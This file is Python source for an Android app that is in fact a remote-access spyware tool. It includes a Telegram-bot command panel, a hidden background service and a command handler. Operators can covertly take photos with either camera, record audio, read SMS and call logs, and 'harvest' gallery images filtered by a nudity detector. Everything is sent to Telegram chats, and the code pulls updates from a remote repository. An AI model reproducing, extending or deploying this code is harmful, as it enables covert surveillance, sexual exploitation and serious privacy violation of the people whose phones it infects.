# -*- coding: utf-8 -*-
import os, sys, threading, importlib, requests, traceback, gc, time, socket, random, shutil
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ========== DNS patch (احتياطي ذكي) ==========
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo
    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        try:
            result = original_getaddrinfo(host, port, family, type, proto, flags)
            if result: return result
        except: pass
        override = {
            'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
            'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
            'zaen1993.github.io': ['185.199.108.153', '185.199.109.153', '185.199.110.153', '185.199.111.153'],
            'cdn.jsdelivr.net': ['151.101.2.229', '151.101.66.229', '151.101.130.229']
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)
    socket.getaddrinfo = patched_getaddrinfo
_patch_dns()

INDEX_BASE_URLS = [
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache', 'Pragma': 'no-cache'
}

def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p

R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)
HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)
MODELS_DIR = os.path.join(R, "models")
os.makedirs(MODELS_DIR, exist_ok=True)

if R not in sys.path: sys.path.insert(0, R)

def start_silent_service():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        nm = autoclass('android.app.NotificationManager')
        ch = autoclass('android.app.NotificationChannel')
        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
        act.getSystemService(nm).createNotificationChannel(channel)
        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
        builder.setSmallIcon(act.getApplicationInfo().icon)
        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
        act.startForeground(9921, builder.build())
        print("Foreground silent service started")
    except Exception as e:
        print(f"Foreground service error: {e}")

def open_notification_settings():
    """يفتح إعدادات التنبيهات للتطبيق ليتمكن المستخدم من إخفاء الإشعار تماماً."""
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        Uri = autoclass('android.net.Uri')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
        intent.putExtra(Settings.EXTRA_APP_PACKAGE, ctx.getPackageName())
        ctx.startActivity(intent)
    except Exception as e:
        print(f"Could not open notification settings: {e}")

def _perms():
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE"
        ])
    except Exception as e:
        print(f"Permissions error: {e}")
    start_silent_service()
    # توجيه المستخدم لإخفاء الإشعار (يعمل بصمت)
    threading.Thread(target=open_notification_settings, daemon=True).start()
    try:
        from jnius import autoclass
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"Battery exemption error: {e}")

def load_secrets_from_config():
    config_module = None
    try:
        config_module = importlib.import_module("config_template")
    except ImportError:
        try:
            config_module = importlib.import_module("config")
        except ImportError: pass
    if config_module is None:
        raise Exception("لا يمكن العثور على config_template.py أو config.py في المسار")
    if not hasattr(config_module, 'load_config'):
        raise Exception("الملف الموجود لا يحتوي على دالة load_config")
    active, reserve, ctrl, vault, secret = config_module.load_config()
    return active, reserve, ctrl, vault, secret

# ========== تضمين الملفات الأساسية (لضمان الإقلاع المحلي) ==========
EMBEDDED_FILES = {
    "telegram_ui.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, threading, logging, requests, sys, importlib, random
from collections import deque
from datetime import datetime

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if P not in sys.path:
    sys.path.insert(0, P)

CACHE_THUMB = os.path.join(P, ".cache_thumb")
if not os.path.exists(CACHE_THUMB):
    os.makedirs(CACHE_THUMB)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

TG_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}

class T:
    def __init__(self, m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
        self.m = m
        self.device_id = getattr(m, 'did', 'unknown_device')
        self.dvs_file = os.path.join(P, "dvs.json")
        self.ses_file = os.path.join(P, "ses.json")
        self.ses = {}
        self.dvs = {}
        self.p_upd = deque(maxlen=200)
        self.rn = True
        self.active_tokens = active_tokens[:]
        self.reserve_tokens = reserve_tokens[:]
        self.ctrl = ctrl_id
        self.dat = vault_id
        self.pw = app_password
        self._load()
        threading.Thread(target=self._session_cleaner, daemon=True).start()
        threading.Thread(target=self._heartbeat_worker, daemon=True).start()

    def _load(self):
        for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f: target.update(json.load(f))
                except: pass

    def _save(self):
        try:
            with open(self.dvs_file, 'w') as f: json.dump(self.dvs, f)
            with open(self.ses_file, 'w') as f: json.dump(self.ses, f)
        except: pass

    def _session_cleaner(self):
        while self.rn:
            now = time.time()
            expired = [cid for cid, exp in self.ses.items() if exp < now]
            if expired:
                for cid in expired: self.ses.pop(cid, None)
                self._save()
            time.sleep(3600)

    def _next_token(self):
        if not self.active_tokens: return None
        rng = random.Random(self.device_id)
        return rng.choice(self.active_tokens)

    def _emergency_switch(self, bad_token):
        if bad_token in self.active_tokens:
            idx = self.active_tokens.index(bad_token)
            self.active_tokens.remove(bad_token)
            if self.reserve_tokens:
                new_token = self.reserve_tokens.pop(0)
                self.active_tokens.append(new_token)
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
                    "parse_mode": "HTML"
                })
            else:
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": "🚨 <b>CRITICAL: No reserve bots left!</b>",
                    "parse_mode": "HTML"
                })

    def _heartbeat_worker(self):
        while self.rn:
            time.sleep(21600)
            if not self.reserve_tokens: continue
            hb_bot = random.choice(self.reserve_tokens)
            try:
                url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
                requests.post(url, data=data, timeout=10, verify=True)
            except: pass

    def _api(self, method, data=None, files=None, retry=3):
        last_token = None
        for attempt in range(retry):
            token = self._next_token()
            if not token: return None
            if attempt > 0 and token == last_token:
                token = self._next_token()
                if not token: return None
            last_token = token
            try:
                url = f"https://api.telegram.org/bot{token}/{method}"
                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS, timeout=25, verify=True)
                result = resp.json()
                if result.get('ok'): return result
                error = result.get('error_code')
                if error == 429:
                    time.sleep(2); continue
                elif error in (401, 403):
                    self._emergency_switch(token)
                else:
                    time.sleep(1)
            except Exception as e:
                logging.error(f"API error {method}: {e}")
                time.sleep(1)
        return None

    def reg(self, device_id, device_model):
        if device_id in self.dvs: return self.dvs[device_id].get('t')
        topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
        res = self._api("createForumTopic", {"chat_id": self.ctrl, "name": topic_name})
        if res and res.get('ok'):
            topic_id = res['result']['message_thread_id']
            self.dvs[device_id] = {"n": device_model, "t": topic_id}
            self._save()
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": topic_id,
                "text": f"<b>✅ Device registered</b>\n<b>{device_model}</b>\n<code>{device_id}</code>",
                "parse_mode": "HTML"
            })
            return topic_id
        return None

    def notify_harvest(self, device_id, count):
        dev = self.dvs.get(device_id)
        if dev and 't' in dev:
            msg = f"📦 <b>Auto harvest</b>\nDevice: {dev['n']}\nItems: {count}\nTime: {datetime.now().strftime('%H:%M:%S')}"
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": dev['t'],
                "text": msg,
                "parse_mode": "HTML"
            })

    def _count_pending_harvest(self):
        if not os.path.exists(CACHE_THUMB): return 0
        return len([f for f in os.listdir(CACHE_THUMB) if not f.startswith('.')])

    def _main_keyboard(self):
        return {"inline_keyboard": [
            [{"text": "📱 Connected devices", "callback_data": "ld"}],
            [{"text": "🧠 AI Status", "callback_data": "ai_status"}, {"text": "🔄 Renew session", "callback_data": "rnw"}],
            [{"text": "🚪 Logout", "callback_data": "ext"}]
        ]}

    def _device_keyboard(self, device_id):
        count = self._count_pending_harvest()
        harvest_text = f"📦 Harvest ({count})" if count > 0 else "📦 Harvest (empty)"
        return {"inline_keyboard": [
            [{"text": "📸 Back camera", "callback_data": f"cam_{device_id}"}, {"text": "🤳 Front camera", "callback_data": f"camf_{device_id}"}],
            [{"text": "🎙️ Record audio", "callback_data": f"mic_{device_id}"}, {"text": harvest_text, "callback_data": f"hrv_{device_id}"}],
            [{"text": "🖼️ Gallery", "callback_data": f"media_{device_id}"}, {"text": "🚀 Send now", "callback_data": f"send_now_{device_id}"}],
            [{"text": "🔙 Back", "callback_data": "ld"}]
        ]}

    def _show_harvest_details(self, chat_id):
        if not os.path.exists(CACHE_THUMB):
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
            return
        files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg','.png','.mp4'))]
        if not files:
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
            return
        total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
        details = (
            f"📊 **Harvest report**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🖼️ Files: `{len(files)}`\n"
            f"💾 Size: `{total_size/(1024*1024):.2f} MB`\n"
            f"⏰ Updated: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
            f"Use '🚀 Send now' to upload immediately."
        )
        self._api("sendMessage", {"chat_id": chat_id, "text": details, "parse_mode": "Markdown"})

    def _is_authorized(self, chat_id):
        return time.time() < self.ses.get(str(chat_id), 0)

    def _handle_message(self, update):
        msg = update.get('message', {})
        chat_id = msg.get('chat', {}).get('id')
        text = msg.get('text', '')
        if not chat_id: return
        if text.startswith('/login'):
            parts = text.split()
            if len(parts) >= 2 and parts[1].strip() == self.pw:
                self.ses[str(chat_id)] = time.time() + 14400
                self._save()
                self._api("sendMessage", {
                    "chat_id": chat_id,
                    "text": "🔓 Login successful",
                    "reply_markup": json.dumps(self._main_keyboard())
                })
            else:
                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ Wrong password"})
        elif self._is_authorized(chat_id) and text == '/menu':
            self._api("sendMessage", {
                "chat_id": chat_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })

    def _handle_callback(self, update):
        cb = update.get('callback_query', {})
        cb_id = cb.get('id')
        if not cb_id or cb_id in self.p_upd: return
        self.p_upd.append(cb_id)
        chat_id = cb.get('message', {}).get('chat', {}).get('id')
        msg_id = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')
        self._api("answerCallbackQuery", {"callback_query_id": cb_id})
        if not self._is_authorized(chat_id):
            self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
            return
        if data == "ld":
            if not self.dvs:
                self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ لا توجد أجهزة مرتبطة حالياً."})
                return
            kb = {"inline_keyboard": []}
            for did, info in self.dvs.items():
                kb["inline_keyboard"].append([{"text": f"📱 {info['n']}", "callback_data": f"dev_{did}"}])
            kb["inline_keyboard"].append([{"text": "🔄 Refresh", "callback_data": "ld"}, {"text": "🔙 Back", "callback_data": "main"}])
            self._api("editMessageText", {
                "chat_id": chat_id, "message_id": msg_id,
                "text": "<b>Select device:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
            return
        if data.startswith("dev_"):
            did = data[4:]
            if did in self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id, "message_id": msg_id,
                    "text": f"🕹️ <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._device_keyboard(did)),
                    "parse_mode": "HTML"
                })
            return
        if data.startswith("hrv_"):
            self._show_harvest_details(chat_id)
            return
        if data.startswith("send_now_"):
            did = data[8:]
            try:
                import commands
                importlib.reload(commands)
                commands.force_send_zip(self.m, did, self, chat_id)
            except Exception as e:
                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
            return
        if data == "ai_status":
            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.model is not None
            status = "✅ Active" if ai_loaded else "❌ Not ready"
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}", "show_alert": True})
            return
        if data == "rnw":
            self.ses[str(chat_id)] = time.time() + 14400
            self._save()
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": "✅ Session renewed"})
            return
        if data == "ext":
            self.ses.pop(str(chat_id), None)
            self._save()
            self._api("editMessageText", {"chat_id": chat_id, "message_id": msg_id, "text": "🔒 Logged out."})
            return
        if data == "main":
            self._api("editMessageText", {
                "chat_id": chat_id, "message_id": msg_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })
            return
        try:
            import commands
            importlib.reload(commands)
            commands.ex(data, self, self.m, chat_id, cb_id)
        except Exception as e:
            logging.error(f"Command error: {e}")
            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})

    def _polling(self):
        offset = 0
        while self.rn:
            token = self._next_token()
            if not token:
                time.sleep(5); continue
            try:
                url = f"https://api.telegram.org/bot{token}/getUpdates"
                params = {"offset": offset, "timeout": 20, "allowed_updates": json.dumps(["message", "callback_query"])}
                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=25, verify=True)
                data = resp.json()
                if data.get('ok'):
                    for upd in data.get('result', []):
                        offset = upd['update_id'] + 1
                        if 'message' in upd: self._handle_message(upd)
                        if 'callback_query' in upd: self._handle_callback(upd)
                time.sleep(0.3)
            except: time.sleep(2)

    def start(self):
        if self.active_tokens:
            threading.Thread(target=self._polling, daemon=True).start()
            logging.info(f"Telegram UI started: {len(self.active_tokens)} active, {len(self.reserve_tokens)} reserve")
        else:
            logging.error("No active tokens, Telegram UI cannot start")
''',

    "monitor.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, random, threading, logging, gc, hashlib
from datetime import datetime, timedelta

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P): os.makedirs(P)

logging.basicConfig(filename=os.path.join(P, "m.log"), level=logging.ERROR, filemode='a',
                    format='%(asctime)s [%(levelname)s] %(message)s')

try:
    from jnius import autoclass
    JNI = True
except ImportError: JNI = False

class M:
    def __init__(self):
        self.d = P
        self.cf = os.path.join(self.d, "c.json")
        self.lh = os.path.join(self.d, "lh")
        self.wt = os.path.join(self.d, "wt")
        self.rn = True
        self.did = None; self.dmd = None; self.last_mid = 0
        self.ui = None; self.daily_zipper = None; self.camera_analyzer = None
        self.nude_detector = None; self.media_scanner = None; self.ctrl = None; self.vlt = None
        self._wake_event = threading.Event()
        self._load_config(); self._get_device_info(); self._setup()

    def _setup(self):
        try:
            with open(os.path.join(self.d, ".nomedia"), 'w') as f: f.write("")
        except: pass

    def _load_config(self):
        default_cfg = {"hth": 15, "wl": False, "iv": 900}
        if os.path.exists(self.cf):
            try:
                with open(self.cf, 'r') as f: default_cfg.update(json.load(f))
            except: pass
        self.cfg = default_cfg

    def _get_ctx(self):
        if not JNI: return None
        try: return autoclass('org.kivy.android.PythonActivity').mActivity
        except: return None

    def _get_device_info(self):
        if JNI:
            try:
                ctx = self._get_ctx()
                Build = autoclass('android.os.Build')
                Secure = autoclass('android.provider.Settings$Secure')
                self.did = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
                self.dmd = f"{Build.MANUFACTURER} {Build.MODEL}"
            except:
                self.did = f"ID_{random.randint(100000, 999999)}"; self.dmd = "Android_Device"
        else:
            self.did, self.dmd = "DEV_PC", "Linux_System"

    def _is_wifi(self):
        if not JNI: return True
        try:
            ctx = self._get_ctx()
            cm = ctx.getSystemService("connectivity")
            ni = cm.getActiveNetworkInfo()
            return ni and ni.isConnected() and ni.getType() == 1
        except: return False

    def _battery_ok(self):
        if not JNI: return 100, True
        try:
            ctx = self._get_ctx()
            IntentFilter = autoclass('android.content.IntentFilter')
            battery_filter = IntentFilter("android.intent.action.BATTERY_CHANGED")
            battery_status = ctx.registerReceiver(None, battery_filter)
            level = battery_status.getIntExtra("level", -1)
            scale = battery_status.getIntExtra("scale", -1)
            status = battery_status.getIntExtra("status", -1)
            percent = int((level / scale) * 100) if scale > 0 else 50
            is_charging = status in (2, 5)
            return percent, is_charging
        except: return 50, False

    def _next_harvest_time(self):
        now = datetime.now()
        delta_hours = random.randint(2, 6); delta_minutes = random.randint(0, 59)
        target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
        return target.isoformat()

    def _harvest_logic(self):
        if not self._is_wifi(): return
        battery, charging = self._battery_ok()
        if battery < self.cfg.get('hth', 15) and not charging: return
        if os.path.exists(self.wt):
            try:
                with open(self.wt, 'r') as f:
                    next_time_str = f.read().strip()
                    if next_time_str and datetime.now() < datetime.fromisoformat(next_time_str): return
            except: pass
        if self.daily_zipper:
            try:
                threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                with open(self.wt, 'w') as f: f.write(self._next_harvest_time())
                with open(self.lh, 'w') as f: f.write(datetime.now().isoformat())
            except Exception as e: logging.error(f"Harvest failed: {e}")
        gc.collect()

    def _loop(self):
        while self.rn:
            try: self._harvest_logic()
            except Exception as e: logging.error(f"Monitor loop error: {e}")
            interval = self.cfg.get('iv', 900)
            self._wake_event.wait(interval)

    def start(self):
        threading.Thread(target=self._loop, daemon=True).start()
        if self.ui and self.did:
            try: self.ui.reg(self.did, self.dmd)
            except Exception as e: logging.error(f"Device registration failed: {e}")

    def stop(self):
        self.rn = False; self._wake_event.set()

def get_device_tag():
    try:
        Secure = autoclass('android.provider.Settings$Secure')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
        if aid: return aid[:8].lower()
    except: pass
    try:
        Build = autoclass('android.os.Build')
        model = f"{Build.MANUFACTURER} {Build.MODEL}"
        return hashlib.md5(model.encode()).hexdigest()[:8]
    except: return "unknown"
''',

    "commands.py": r'''
# -*- coding: utf-8 -*-
import os, time, json, threading, logging, sys, gc
from datetime import datetime

def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
PENDING_DIR = os.path.join(P, "pending_upload")
TEMP_DIR = os.path.join(P, "ctmp")
for d in [PENDING_DIR, TEMP_DIR]:
    if not os.path.exists(d): os.makedirs(d)

if P not in sys.path: sys.path.insert(0, P)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError: JNI = False

class C:
    def __init__(self):
        self.mic_busy = False; self._cleanup()

    def _cleanup(self):
        try:
            now = time.time()
            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
                if not os.path.exists(folder): continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.getmtime(path) < now - max_age:
                        os.remove(path)
        except: pass

    def _ensure_components(self, m):
        try:
            if not hasattr(m, 'nude_detector') or m.nude_detector is None:
                try:
                    import nude_detector
                    m.nude_detector = nude_detector.NudeDetector(m)
                    logging.info("✅ NudeDetector loaded")
                except Exception as e: logging.error(f"NudeDetector init error: {e}")
            if not hasattr(m, 'media_scanner') or m.media_scanner is None:
                import media_scanner
                m.media_scanner = media_scanner.MediaScanner(det=m.nude_detector, ui=m.ui)
                logging.info("✅ MediaScanner loaded")
            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                import gallery_browser
                m.gallery_browser = gallery_browser.G(m.media_scanner, m.ui)
                logging.info("✅ GalleryBrowser loaded")
            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                import camera_analyzer
                m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
                logging.info("✅ CameraAnalyzer loaded")
            if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
                import daily_zipper
                m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.ui)
                logging.info("✅ DailyZipper loaded")
        except Exception as e: logging.error(f"Component init error: {e}")

    def _send_text_file(self, tg, chat_id, content, filename):
        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
        try:
            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f: f.write(content)
            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument", {"chat_id": chat_id, "caption": f"📄 {filename}"}, {"document": f})
            if resp and resp.get('ok'): os.remove(temp_path)
            else: logging.warning(f"File {filename} left in pending")
        except Exception as e: logging.error(f"_send_text_file error: {e}")

    def _record_audio(self, duration=10):
        if not JNI or self.mic_busy: return None
        self.mic_busy = True; media_recorder = None
        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")
        try:
            MR = autoclass('android.media.MediaRecorder')
            media_recorder = MR()
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare(); media_recorder.start()
            time.sleep(duration)
            media_recorder.stop(); media_recorder.reset()
            return out_path
        except Exception as e:
            logging.error(f"Recording error: {e}"); return None
        finally:
            if media_recorder:
                try: media_recorder.release()
                except: pass
            self.mic_busy = False

    def _call_log(self, limit=100):
        if not JNI: return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
            if not cursor: return "لا صلاحية أو لا توجد مكالمات"
            lines = []
            idx_name = cursor.getColumnIndex("name"); idx_number = cursor.getColumnIndex("number")
            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                lines.append(f"👤 {name} ({num})")
            return "\n".join(lines) if lines else "سجل المكالمات فارغ"
        except Exception as e:
            logging.error(f"Call log error: {e}"); return "خطأ في قراءة المكالمات"
        finally:
            if cursor: cursor.close()

    def _sms_log(self, limit=100):
        if not JNI: return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
            if not cursor: return "لا صلاحية أو لا توجد رسائل"
            lines = []
            idx_addr = cursor.getColumnIndex("address"); idx_body = cursor.getColumnIndex("body")
            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                lines.append(f"📩 من: {addr}\n💬 {body}\n---")
            return "\n".join(lines) if lines else "صندوق الوارد فارغ"
        except Exception as e:
            logging.error(f"SMS error: {e}"); return "خطأ في قراءة الرسائل"
        finally:
            if cursor: cursor.close()

    def _battery_ok(self, m):
        try:
            b, ch = m._battery_ok() if hasattr(m, '_battery_ok') else (100, False)
            return b >= 15 or ch
        except: return True

    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            if cbq: tg._api("answerCallbackQuery", {"callback_query_id": cbq})
            self._ensure_components(m)
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                parts = cmd.split("|"); action = parts[0]
                if action == "g_nav":
                    cat, page = parts[1], int(parts[2])
                    new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                    tg._api("editMessageReplyMarkup", {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
                elif action == "g_opt": m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
                elif action == "g_act": m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
                elif action == "g_conf":
                    act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                    confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                                   {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                    tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟", "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
                return
            if cmd.startswith(("cam_", "camf_")):
                is_front = 1 if "camf_" in cmd else 0
                if not self._battery_ok(m):
                    tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"}); return
                tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
                m.camera_analyzer.harvest(cam_id=is_front)
                tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها. سيتم إرسال النتائج لاحقاً."})
                return
            if cmd.startswith("mic_"):
                if self.mic_busy:
                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً"}); return
                tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
                audio_path = self._record_audio(10)
                if audio_path and os.path.exists(audio_path):
                    with open(audio_path, 'rb') as f:
                        target = getattr(m, 'vlt', cid)
                        tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                    os.remove(audio_path)
                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                return
            if cmd.startswith("callog_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._call_log()
                self._send_text_file(tg, cid, data, "calls.txt"); return
            if cmd.startswith("sms_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._sms_log()
                self._send_text_file(tg, cid, data, "sms.txt"); return
            if cmd.startswith("hrv_"):
                if hasattr(m, 'daily_zipper') and m.daily_zipper:
                    tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})
                    threading.Thread(target=m.daily_zipper.run, daemon=True).start()
                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
                return
            if cmd.startswith("send_now_"):
                if hasattr(m, 'daily_zipper') and m.daily_zipper:
                    tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})
                    threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,)).start()
                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
                return
            if cmd.startswith("media_"):
                if hasattr(m, 'gallery_browser') and m.gallery_browser:
                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                    res = tg._api("sendMessage", {"chat_id": cid, "text": "🖼️ معرض الوسائط", "reply_markup": json.dumps(kb)})
                    if res and res.get('ok'): m.last_mid = res['result']['message_id']
                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return
            tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف."})
        except Exception as e:
            logging.error(f"Command handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
